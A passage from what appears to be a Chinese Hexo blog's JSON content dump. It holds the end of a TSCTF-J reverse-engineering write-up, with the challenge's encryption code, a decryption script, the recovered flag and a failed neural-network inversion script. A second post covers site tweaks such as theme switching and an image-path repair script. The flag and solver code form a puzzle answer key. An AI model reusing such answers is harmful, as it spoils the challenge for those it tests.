class=\"keyword\">def</span> <span class=\"title function_\">Charlie</span>(<span class=\"params\">Alice, Bob</span>): <span class=\"comment\"># 就是异或</span></span><br><span class=\"line\">        <span class=\"comment\"># ret = 0</span></span><br><span class=\"line\">        <span class=\"comment\"># v1 = round(Alice)</span></span><br><span class=\"line\">        <span class=\"comment\"># v2 = round(Bob)</span></span><br><span class=\"line\">        <span class=\"comment\"># v5 = 1</span></span><br><span class=\"line\">        <span class=\"comment\"># while not (v1 == v2 == 0):</span></span><br><span class=\"line\">        <span class=\"comment\">#     v3 = v1 % 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     v4 = v2 % 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     v6 = (v3+v4) % 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     ret += v5*v6</span></span><br><span class=\"line\">        <span class=\"comment\">#     v1 //= 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     v2 //= 2</span></span><br><span class=\"line\">        <span class=\"comment\">#     v5 *= 2</span></span><br><span class=\"line\">        <span class=\"comment\"># return ret</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> Alice ^ Bob</span><br><span class=\"line\">    arc[yindex-<span class=\"number\">1</span>] = Charlie(arc[yindex-<span class=\"number\">1</span>], arc[yindex-<span class=\"number\">2</span>])</span><br><span class=\"line\">    yindex += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">yindex = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> yindex &lt;= <span class=\"built_in\">len</span>(arc) +<span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"comment\"># abstruse</span></span><br><span class=\"line\">    <span class=\"comment\"># def Delta(Masking):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return Masking % 16 * 16</span></span><br><span class=\"line\">    <span class=\"comment\"># def Echo(Layer):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return Layer // 16</span></span><br><span class=\"line\">    <span class=\"comment\"># def Foxfort(ChuChu, Pareo):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return Charlie(ChuChu, Pareo)</span></span><br><span class=\"line\">    <span class=\"comment\"># arc[yindex-1] = Foxfort(Delta(arc[yindex-1]),Echo(arc[yindex-1]))</span></span><br><span class=\"line\">    tmp = arc[yindex-<span class=\"number\">1</span>]</span><br><span class=\"line\">    arc[yindex-<span class=\"number\">1</span>] = (tmp&gt;&gt;<span class=\"number\">4</span>)|((tmp&amp;<span class=\"number\">0xf</span>)&lt;&lt;<span class=\"number\">4</span>)</span><br><span class=\"line\">    yindex += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">yindex = <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> yindex &lt;= <span class=\"built_in\">len</span>(arc) +<span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"comment\"># XiaoYuan</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">Hotel</span>(<span class=\"params\">Lock</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> arc[Lock-<span class=\"number\">1</span>] != src[Lock-<span class=\"number\">2</span>]:</span><br><span class=\"line\">            exit(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(src) != <span class=\"built_in\">len</span>(arc)-<span class=\"number\">1</span>:</span><br><span class=\"line\">        exit(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        Hotel(yindex)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;FLAG:&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>.join(arc))</span><br></pre></td></tr></table></figure>\n\n<p>大致加密过程是：转序号、值加编号、前后异或、交换高低位</p>\n<p>所以给出解密代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src0 = [<span class=\"number\">211</span>, <span class=\"number\">71</span>, <span class=\"number\">210</span>, <span class=\"number\">132</span>, <span class=\"number\">193</span>, <span class=\"number\">114</span>, <span class=\"number\">244</span>, <span class=\"number\">208</span>, <span class=\"number\">213</span>, <span class=\"number\">99</span>, <span class=\"number\">37</span>, <span class=\"number\">214</span>, <span class=\"number\">224</span>, <span class=\"number\">101</span>, <span class=\"number\">98</span>, <span class=\"number\">212</span>, <span class=\"number\">224</span>, <span class=\"number\">118</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">src = [<span class=\"number\">114</span>]+[(v&gt;&gt;<span class=\"number\">4</span>)|((v&amp;<span class=\"number\">0xf</span>)&lt;&lt;<span class=\"number\">4</span>) <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> src0]</span><br><span class=\"line\"></span><br><span class=\"line\">dst = []</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(src) &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">    num = src.pop()</span><br><span class=\"line\">    dst.append(num^src[-<span class=\"number\">1</span>])</span><br><span class=\"line\">dst = src + dst[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">ori = [(c-i-<span class=\"number\">1</span>-<span class=\"number\">1</span>)%<span class=\"number\">255</span> <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(dst)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(ori))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-65.png\" alt=\"alt text\">（p对应114）</p>\n<p><box>TSCTF-J{LET_M3_8E_W1TH_Y0U}</box></p>\n<h2 id=\"【附】JustReverse的代码（失败品）：\"><a href=\"#【附】JustReverse的代码（失败品）：\" class=\"headerlink\" title=\"【附】JustReverse的代码（失败品）：\"></a>【附】JustReverse的代码（失败品）：</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">58</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Net</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Net, <span class=\"variable language_\">self</span>).__init__()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.linear = nn.Linear(n, n*n)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv1=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv2=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">1</span>, <span class=\"number\">1</span>), stride=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv3=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=<span class=\"number\">1</span>, padding=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.relu=nn.ReLU()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = x.view(<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>*n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv1(x)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.relu(x)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv2(x)</span><br><span class=\"line\">        x = x.view(n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.linear(x)</span><br><span class=\"line\">        x = x.view(<span class=\"number\">1</span>, <span class=\"number\">1</span>, n, n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv3(x)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x</span><br><span class=\"line\"></span><br><span class=\"line\">mynet=Net()</span><br><span class=\"line\">mynet.load_state_dict(torch.load(<span class=\"string\">&#x27;model.pth&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">out = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> line: <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">float</span>, line.split(<span class=\"string\">&#x27; &#x27;</span>))), <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;ciphertext.txt&#x27;</span>).readlines()))</span><br><span class=\"line\"></span><br><span class=\"line\">out = np.array(out)</span><br><span class=\"line\"></span><br><span class=\"line\">out -= mynet.conv3.bias.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reverse_conv</span>(<span class=\"params\">kernel, after, before_size</span>):</span><br><span class=\"line\">    last_line = [<span class=\"number\">0</span>] + [<span class=\"number\">0</span>] * before_size + [<span class=\"number\">0</span>]</span><br><span class=\"line\">    before = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(before_size):</span><br><span class=\"line\">        line = [<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(before_size):</span><br><span class=\"line\">            line.append((after[i][j] - kernel[<span class=\"number\">0</span>][<span class=\"number\">0</span>] * last_line[j] - kernel[<span class=\"number\">0</span>][<span class=\"number\">1</span>] * last_line[j+<span class=\"number\">1</span>] - kernel[<span class=\"number\">1</span>][<span class=\"number\">0</span>] * <span class=\"number\">0</span>)/kernel[<span class=\"number\">1</span>][<span class=\"number\">1</span>])</span><br><span class=\"line\">        last_line = line + [<span class=\"number\">0</span>]</span><br><span class=\"line\">        before.append(line[<span class=\"number\">1</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> before</span><br><span class=\"line\"></span><br><span class=\"line\">outl = reverse_conv(mynet.conv3.weight.detach().numpy().reshape((<span class=\"number\">2</span>, <span class=\"number\">2</span>)).tolist(), out.tolist(), n)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(outl)</span></span><br><span class=\"line\"></span><br><span class=\"line\">lb = mynet.linear.bias.detach().numpy()</span><br><span class=\"line\">lw = mynet.linear.weight.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(lb.shape)</span></span><br><span class=\"line\"><span class=\"comment\"># print(lw.shape)</span></span><br><span class=\"line\"></span><br><span class=\"line\">out2 = np.linalg.inv(lw.T @ lw) @ (lw.T @ (np.array(outl).reshape((-<span class=\"number\">1</span>)) - lb))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out2)</span></span><br><span class=\"line\"></span><br><span class=\"line\">out1 = (out2 - mynet.conv2.bias.detach().numpy()) / mynet.conv2.weight.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">w1 = mynet.conv1.weight.detach().numpy()</span><br><span class=\"line\">b1 = mynet.conv1.bias.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\">ori = (out1 - b1).reshape((-<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(ori)</span><br><span class=\"line\">ajust = [<span class=\"built_in\">round</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ori.tolist()]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ajust)</span><br><span class=\"line\">b = <span class=\"built_in\">sum</span>([[i&amp;<span class=\"number\">1</span>, (i&amp;<span class=\"number\">2</span>)//<span class=\"number\">2</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ajust], []) + <span class=\"built_in\">sum</span>([[(i&amp;<span class=\"number\">4</span>)//<span class=\"number\">4</span>, (i&amp;<span class=\"number\">8</span>)//<span class=\"number\">8</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ajust], [])</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(b), <span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, b[i:i+<span class=\"number\">8</span>])), base=<span class=\"number\">2</span>)), end=<span class=\"string\">&#x27;&#x27;</span>, flush=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<script>\n  // 修复图炸的情况\n  (new Array(...document.getElementsByTagName('img'))).forEach(\n      img=>{\n          if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n              console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n              img.src=img.src.split('/').slice(-1)\n          }\n  })\n</script>"},{"title":"小站修补琐记","date":"2025-11-04T11:35:35.000Z","_content":"\n因为自己非常追求细节，同时也想分享一下开发过程中的琐事与技巧，特此设立“小站修补琐记”板块，持续更新！\n\n## 2025.10 + 2025.11\n\n### 明暗切换\n\nCactus模板内置了几种颜色主题，但是只能通过配置文件切换，不能动态切换。\n\n动态切换明暗的核心是通过对`html`元素（或者`body`元素）添加如`light`/`dark`这样的class，再在CSS分别写入对应的颜色等规则完成的\n\n经过观察，CSS使用[Stylus](https://stylus-lang.com/)编译，颜色被放在了`themes/cactus/css/_color`下的各个文件里，以变量形式存储，而Stylus支持[块级导入](https://stylus-lang.com/docs/import.html#block-level-import)，所以，我们可以把导入从这样\n\n```stylus\n@import \"_colors/\" + $colors\n```\n\n写成\n\n```stylus\n.light\n    @import \"_colors/\" + $colors-light\n.night\n    @import \"_colors/\" + $colors-night\n```\n\n而`$colors`这个变量在`$_variables.styl`里面定义，进行相应修改即可\n\n但仅仅这样在编译的时候会报错，原因是在CSS的定义中用到了`darken`之类的函数，这些函数会在编译时执行，然后硬编码进生成的.css文件中，然而块级定义导致这些变量没有明确的值，无法执行函数，故报错终止。\n\n最好的办法就是将这些定义的`.light`/`.night`分开定义，比如，把下面的\n\n```stylus\n*::-webkit-scrollbar-thumb:active\n  background-color: darken($color-scrollbar, 30%)\n```\n\n写成\n\n```stylus\n*::-webkit-scrollbar-thumb:active\n  .night &\n    background-color: darken($color-scrollbar, 30%)\n  .light &\n    background-color: darken($color-scrollbar, 30%)\n```\n\n但是我不保证这种方法的可行性，因为我一开始不知道Stylus可以块级导入，就手动把所有的变量加上`-light-`/`-dark-`中缀，并将颜色直接硬编码在`style.styl`里面（所以才说拉了坨大的，而且有一大堆漏的）\n\n然后就是增加切换按钮和持久化存储功能，这里通过修改模板`layout.ejs`实现\n\n在`head.ejs`里面添加一段JavaScript，用于切换主题\n\n```javascript\ncolorScheme = localStorage.getItem('color-scheme') || (matchMedia('(prefers-color-scheme: dark)').matches?\"night\":\"light\")\nif(colorScheme===\"light\"){\n    let classlist = document.querySelector(\"html\").classList\n    classlist.remove('night')\n    classlist.add('light')\n}\n```\n\n先尝试从`localStorage`里面读取是否已有主题，如果没有，就根据媒体查询同步浏览器主题。为了防止JS莫名其妙的炸掉，在`html`上加了`.night`，所以如果选择亮主题的话就要切换。\n\n然后是切换按钮，在`layout.ejs`的`body`下面添加\n\n```html\n<div style=\"position: fixed; right: 0; bottom: 0; z-index: 999; margin: 10px;\">\n    <button id=\"sun\" style=\"border: none; background: none; color:white; cursor: pointer;\" onclick=\"switchColorScheme('light')\"><svg style=\"width: 25px; height: 25px;\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\"><path fill=\"none\" d=\"M0 0h24v24H0z\"></path><path d=\"M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z\"></path></svg></button>\n    <button id=\"moon\" style=\"border: none; background: none; color: black; cursor: pointer;\" onclick=\"switchColorScheme('night')\"><svg style=\"width: 25px; height: 25px;\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\"><path fill=\"none\" d=\"M0 0h24v24H0z\"></path><path d=\"M11.3807 2.01886C9.91573 3.38768 9 5.3369 9 7.49999C9 11.6421 12.3579 15 16.5 15C18.6631 15 20.6123 14.0843 21.9811 12.6193C21.6613 17.8537 17.3149 22 12 22C6.47715 22 2 17.5228 2 12C2 6.68514 6.14629 2.33869 11.3807 2.01886Z\"></path></svg></button>\n</div>\n```\n\n在里面的图标是从[这个网站](https://remixicon.com/)复制的矢量图\n\n以及切换逻辑\n\n```javascript\ncolorScheme = localStorage.getItem('color-scheme') || (matchMedia('(prefers-color-scheme: dark)').matches?\"night\":\"light\")\nif(colorScheme==='light'){\n    document.getElementById(\"sun\").style.display = \"none\"\n    document.getElementById(\"moon\").style.display = \"\"\n}else{\n    document.getElementById(\"sun\").style.display = \"\"\n    document.getElementById(\"moon\").style.display = \"none\"\n}\nfunction switchColorScheme(scheme){\n    localStorage.setItem(\"color-scheme\", scheme)\n    if(scheme==='light'){\n        document.getElementById(\"sun\").style.display = \"none\"\n        document.getElementById(\"moon\").style.display = \"\"\n        let classlist = document.querySelector(\"html\").classList\n        classlist.remove('night')\n        classlist.add('light')\n    }else{\n        document.getElementById(\"sun\").style.display = \"\"\n        document.getElementById(\"moon\").style.display = \"none\"\n        let classlist = document.querySelector(\"html\").classList\n        classlist.add('night')\n        classlist.remove('light')\n    }\n}\n```\n\n接下来就可以自如切换啦~\n\n### 返回按钮\n\n~~有一点小瑕疵，因为我加的返回按钮是通过`history.go(-1)`实现的，所以在这里切换主题后通过返回按钮返回后需要刷新才会生效，并且在通过目录跳转过的情况下这个按钮会返回上一个锚点，而不是上一个界面。~~  \n已修复，现在返回按钮通过`location.href = document.referrer || '/'`实现（但还是有bug，如果从一篇文章跳到另一篇，用返回键就会来回跳转，或许应该用`SessionStorage`？）\n\n### 左上角的博客名称\n\n最开始是没想适配手机的，但是后面还是适配了\n\n添加没什么，主要讲讲如何适配\n\n首先，在电脑这种大地方，在左上角显示并不多余，而在手机的首页和关于页等地，有一个博客名称，故在这些页隐藏；在文章页，屏幕比较窄的话图标会和字重叠，干脆显示成一整行，中间有一个过渡态，就是刚刚穿过文字显示边界的时候，和“返回”按钮挨得特别近，不好看，就让它挨着左上角了\n\n![](GIF%202025-11-4%2020-49-48.gif)\n\n![](GIF%202025-11-4%2020-50-19.gif)\n\n其实对右边那个工具栏我也有修改，让它翻下去不会消失，但是页面变窄之后会和左上角的重合，就是以此分界过渡态和横条状态\n\n```css\n// is_post() 时\n@media screen and (max-width: 1468px) { // 过渡态\n    .hide-on-phone{\n        margin: 0px !important;\n        border-bottom-left-radius: 0px !important;\n        border-top-right-radius: 0px !important;\n        border-top: none !important;\n        border-left: none !important;\n    }\n}\n@media screen and (max-width: 630px) { // 横条状态\n    .hide-on-phone{\n        margin: 0 !important;\n        width: 100%;\n        border: none !important;\n        border-radius: 0 !important;\n        border-bottom: gray 1px solid !important;\n    }\n}\n\n// !is_post() 时\n@media screen and (max-width: 1468px) { // 直接隐藏\n    .hide-on-phone{\n        display: none !important;\n    }\n}\n```\n\n### 随机学校\n\n这个是一个很简单的JavaScript动态界面，每次会用`Math.floor(Math.random()*3)`生成随机数`0`/`1`/`2`，然后用`document.getElementById(...).innerText = ...`完成动态修改\n\n并且为了~~防止小孩误食~~防止真的有人去报考<span style=\"text-decoration: underline wavy red;\" title=\"这是《人民日报》报道过的“野鸡大学”\" onclick=\"alert('我说没有就没有！')\">中国邮电大学</span><sup><a id=\"baikePortal\" href=\"https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/7527114\">百度百科传送门</a></sup>，更新加上了红色波浪线警示，并且将鼠标放置在其上时会显示提示（前面的这个也有），并且可以点击刷新（前面的没有），并且人性化地考虑到一顿狂点可能会被选中而影响美观，特意添加了`user-select: none`（前面那个也没有）\n\n<style>\n    .light #baikePortal {\n        color: blue;\n    }\n    .night #baikePortal {\n        color: lightblue;\n    }\n</style>\n\n```html\n......目前就读于<span id=\"studyIn\" style=\"text-decoration: underline wavy red; cursor: pointer; user-select: none;\" title=\"Not Truth\"></span>......\n\n<script>\n    studyIn = [\"北京邮电学院\", \"中国邮电大学\", \"北京等通知大学\"]\n    randomStudyIn = ()=>{document.getElementById(\"studyIn\").innerText = studyIn[Math.floor(Math.random()*3)]}\n    randomStudyIn()\n    document.getElementById(\"studyIn\").addEventListener(\"click\", randomStudyIn)\n</script>\n```\n\n### 图裂修复\n\n这个似乎是hexo的特性，网上的解决方法好像都要额外下载内容，我就不！反正图片已经被移动到正确的地方了，那我就写一个JavaScript修复就是了嘛\n\n就目前而言一切正常，可以放心食用\n\n```javascript\n// 修复图炸的情况\n(new Array(...document.getElementsByTagName('img'))).forEach(\n    img=>{\n        if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n            console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n            img.src=img.src.split('/').slice(-1)\n        }\n})\n```\n\n前面的提示的路径也是动态生成的\n\n又小小的更新一下（2026-1-3），加了一个`decodeURI`解码`%xx`，使log更像人类（bushi\n\n```markdown\n> 不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用\n> \n> 如果图炸了的话请手动拼接URL，为\n>\n> <span id=\"urlNow\"></span>image-编号.png\n\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n```\n\n至于为什么是`image-编号.png`，是因为在VSCode的Markdown编辑器里粘贴图片的默认命名就是这个，还是要以实际为准\n\n## 2026.1\n\n### back按钮\n\n突然想捣腾一下小站了，把back按钮使用sessionStorage存储，这下不至于在同一页的锚点上来回跳了，\n但是这样的操作成功地往浏览器自己的History里面拉了一坨大的：每次点back会被认为是一次“新页面”\n\n综合考虑下，打算给自己的网页加一个FeatureConfig页\n\n### FeatureConfig页\n\n说搞就搞！\n\n首先在首页加一个Feature按钮，找到面包条在`_partial/header.ejs`里生成\n\n![](image0.png)\n\n面包条的内容来源于theme的config，进去修改，并且__应该是翻译函数，所以为了用不到的i18n，改一下对应翻译的内容\n\n![](image.png)\n\n![](image-1.png)\n\n![](image-2.png)\n\n然后`hexo g && hexo s`一下看看效果\n\n![](image-3.png)\n\n![](image-4.png)\n\n好！接下来就是添加可选的特性了！\n\n特性依旧使用localStorage存储\n\n先来一个`localStorage`检测\n\n```html\n<p id=\"support-storage\" class=\"unknow\">正在检测你的浏览器是否支持localStorage……🔎</p>\n\n<style>\n    .unknow{\n        border: 1px hsla(54, 88%, 24%, 1.00) solid;\n        color: hsla(54, 88%, 24%, 1.00);\n        background-color: hsla(54, 90%, 85%, 1.00);\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .support{\n        border: 1px #077207 solid;\n        color: #077207;\n        background-color: #b4fbb4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .unsupport{\n        border: 1px #720707 solid;\n        color: #720707;\n        background-color: #fbb4b4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n</style>\n\n<script>\n    function test(){\n        try{\n            localStorage.setItem('test', 'ok');\n            var result = localStorage.getItem('test') == 'ok';\n            localStorage.removeItem('test');\n            return result;\n        }catch(error){\n            console.error(error);\n            return false;\n        }\n    }\n    let result = test();\n    document.getElementById('support-storage').classList.remove('unknow')\n    if(result){\n        document.getElementById('support-storage').innerText = '你的浏览器支持localStorage！🎉🎉🎉'\n        document.getElementById('support-storage').classList.add('support')\n    }else{\n        document.getElementById('support-storage').innerText = '你的浏览器好像不支持localStorage！🤔'\n        document.getElementById('support-storage').classList.add('unsupport')\n    }\n</script>\n```\n\n然后加上各部分的代码……（有点多，不放了）\n\n一通倒腾，搞定了~ [修改特性传送门](/features/)\n\n并且为了方便，加了个toc属性，通过`layout.ejs`里面判断`page.toc`是否为真来强制显示toc\n\n希望不要有bug\n\n### 给图片加边框\n\n从背景相似的地方截图根本看不清边界，给所有图片加了一个边框~\n\n### 修复了一些之前产的史\n\n如题，发现于原版Cactus有点不一样，经查发现`.light selector`无法生效，需替换成\n```stylus\nselector\n    .light &\n        ...\n```\n\n并且将desktop版的nav改回了仅在顶部附近显示（这里我发现阈值过小，导致无法重新显示，于是调大了阈值，并且在已经写了这么多NativeJS的情况下发现他竟然有jQuery……）\n\n### 上线“友链抽奖机”\n\n~~虽然一个友链都没有~~ ，但是“友链抽奖机”终于写完了！\n\n这个抽奖机拥抱AI，因为我实在不想写前端了！用的D老师，效果还不错~\n\n快去[抽友链](/friends/)吧！\n\n对了，把D老师之前几版也放一下，下面的都是D老师根据提示词自己写出来的~\n\n<style>\n    details {\n        border: 1px solid;\n        padding: 5px;\n        border-radius: 5px;\n    }\n\n    details:open summary {\n        border-bottom: 1px solid;\n    }\n</style>\n\n* [V1](/friends/draft/ds_v1.html) -> 最原始的简单提示词，看起来不错，就是AI味太大了\n  